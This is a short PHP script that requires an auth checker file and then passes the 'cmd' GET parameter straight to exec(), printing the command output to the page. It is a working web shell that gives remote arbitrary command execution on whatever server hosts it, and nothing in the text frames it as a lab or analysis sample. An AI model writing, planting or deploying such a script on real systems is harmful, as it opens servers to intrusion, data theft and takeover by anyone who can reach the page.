<?php

require '../auth_checker.php';

?>

<?php

if (!array_key_exists('cmd', $_GET)) {
    echo "Enter command as GET parameter with name 'cmd'";
    exit();
}

exec($_GET["cmd"], $output);

foreach ($output as $item) {
    echo "$item</br>";
}

?>